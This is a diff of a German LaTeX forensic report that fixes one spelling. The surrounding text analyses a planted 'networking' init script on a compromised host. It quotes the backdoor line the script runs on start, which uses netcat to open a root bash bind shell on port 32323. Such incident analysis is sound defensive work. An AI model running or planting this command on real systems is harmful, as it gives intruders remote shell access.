@@ -39,7 +39,7 @@ drwxr-xr-x 5 root root 4,0K Jan 28  2010 ..
 -rw-r--r-- 1 1001 root  675 Mai 12  2008 .profile
 \end{verbatim}
 
-Als erstes wurde die \texttt{networking} Datei näher betrachtet. Hierbei handelt es sich um ein Script welches wahrscheinlich das Original unter \texttt{/etc/init.d/} ersetzen soll. Sollte dies der Fall sein und das Skript wird mit dem Parameter \texttt{start} aufgerufen, wird folgende Zeile ausgeführt:
+Als erstes wurde die \texttt{networking} Datei näher betrachtet. Hierbei handelt es sich um ein Skript welches wahrscheinlich das Original unter \texttt{/etc/init.d/} ersetzen soll. Sollte dies der Fall sein und das Skript wird mit dem Parameter \texttt{start} aufgerufen, wird folgende Zeile ausgeführt:
 \begin{verbatim}
 /usr/local/bin/mysudo "/var/www/upload/netcat -nvv -l -e /bin/bash -p 32323"
 \end{verbatim}
